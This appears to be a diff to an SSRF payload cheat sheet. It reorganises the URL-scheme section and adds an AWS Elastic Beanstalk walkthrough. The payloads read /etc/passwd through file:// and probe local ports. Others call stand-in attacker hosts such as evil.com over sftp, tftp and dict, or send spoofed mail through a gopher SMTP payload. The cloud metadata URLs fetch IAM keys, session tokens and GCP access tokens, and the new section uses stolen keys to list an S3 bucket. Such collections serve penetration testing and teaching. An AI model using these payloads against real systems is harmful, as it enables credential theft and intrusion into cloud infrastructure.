@@ -8,9 +8,17 @@ Server Side Request Forgery or SSRF is a vulnerability in which an attacker forc
 * [Payloads with localhost](#payloads-with-localhost)
 * [Bypassing filters](#bypassing-filters)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
+  * [file://](#file)
+  * [http://](#http)
+  * [dict://](#dict)
+  * [sftp://](#sftp)
+  * [tftp://](#tftp)
+  * [ldap://](#ldap)
+  * [gopher://](#gopher)
 * [SSRF to XSS](#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
+  * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
   * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
   * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
   * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
@@ -189,7 +197,9 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ## SSRF exploitation via URL Scheme
 
-File : allows an attacker to fetch the content of a file on the server
+### File 
+
+Allows an attacker to fetch the content of a file on the server
 
 ```powershell
 file://path/to/file
@@ -198,7 +208,9 @@ file://\/\/etc/passwd
 ssrf.php?url=file:///etc/passwd
 ```
 
-Http: allows an attacker to fetch any content from the web, it can also be used to scan ports.
+### HTTP
+
+Allows an attacker to fetch any content from the web, it can also be used to scan ports.
 
 ```powershell
 ssrf.php?url=http://127.0.0.1:22
@@ -210,32 +222,40 @@ ssrf.php?url=http://127.0.0.1:443
 
 The following URL scheme can be used to probe the network
 
-Dict : the DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+### Dict
+
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
 
 ```powershell
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 ```
 
-Sftp : a network protocol used for secure file transfer over secure shell
+### SFTP 
+
+A network protocol used for secure file transfer over secure shell
 
 ```powershell
 ssrf.php?url=sftp://evil.com:11111/
 ```
 
-Tftp : Trivial File Transfer Protocol, works over UDP
+### TFTP
+
+Trivial File Transfer Protocol, works over UDP
 
 ```powershell
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 ```
 
-Ldap : Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+### LDAP
+
+Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
 
 ```powershell
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
 ```
 
-Gopher
+### Gopher
 
 ```powershell
 ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
@@ -257,7 +277,7 @@ You didn't say the magic word !
 QUIT
 ```
 
-Gopher SMTP - Back connect to 1337
+#### Gopher SMTP - Back connect to 1337
 
 ```php
 Content of evil.com/redirect.php:
@@ -269,7 +289,7 @@ Now query it.
 https://example.com/?q=http://evil.com/redirect.php.
 ```
 
-Gopher SMTP - send a mail
+#### Gopher SMTP - send a mail
 
 ```php
 Content of evil.com/redirect.php:
@@ -357,11 +377,34 @@ http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
 http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
 ```
 
 E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
+
+
+### SSRF URL for AWS Elastic Beanstalk
+
+We retrieved the `accountId` and `region` from the API.
+
+```powershell
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+We then retrieved the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.
+
+```powershell
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)
+
+Then use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
+
 
 ### SSRF URL for Google Cloud
 
@@ -394,6 +437,7 @@ Interesting files to pull out:
 - SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
 - Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
 - Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
+
 
 ### SSRF URL for Digital Ocean
 
@@ -521,3 +565,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
 - [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
+- [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
